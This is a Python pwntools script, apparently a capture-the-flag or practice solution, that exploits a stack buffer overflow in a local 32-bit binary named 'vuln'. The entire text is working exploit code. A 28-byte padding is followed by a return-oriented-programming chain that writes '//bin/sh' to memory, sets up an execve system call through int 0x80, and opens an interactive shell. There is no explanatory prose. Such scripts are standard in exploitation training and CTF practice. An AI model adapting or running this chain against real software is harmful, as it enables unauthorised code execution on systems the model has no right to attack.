from pwn import *



from struct import pack

r = process("./vuln")
offset = 28

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += b'//bi'
rop += rebase_0(0x00001adb) # 0x08049adb: pop edi; ret; 
rop += rebase_0(0x00092060)
rop += rebase_0(0x00057471) # 0x0809f471: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += b'n/sh'
rop += rebase_0(0x00001adb) # 0x08049adb: pop edi; ret; 
rop += rebase_0(0x00092064)
rop += rebase_0(0x00057471) # 0x0809f471: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000e420) # 0x08056420: xor eax, eax; ret; 
rop += rebase_0(0x00026e6b) # 0x0806ee6b: pop edx; ret; 
rop += rebase_0(0x00092068)
rop += rebase_0(0x0000ee65) # 0x08056e65: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00026e92) # 0x0806ee92: pop ecx; pop ebx; ret; 
rop += rebase_0(0x00092068)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x00092060)
rop += rebase_0(0x00026e6b) # 0x0806ee6b: pop edx; ret; 
rop += rebase_0(0x00092068)
rop += rebase_0(0x0000e420) # 0x08056420: xor eax, eax; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x0004ad30) # 0x08092d30: add eax, 1; ret; 
rop += rebase_0(0x000277a0) # 0x0806f7a0: int 0x80; ret; 

payload = b""
payload += b"A"*offset
payload += rop

r.recvline()
r.sendline(payload)
r.interactive()
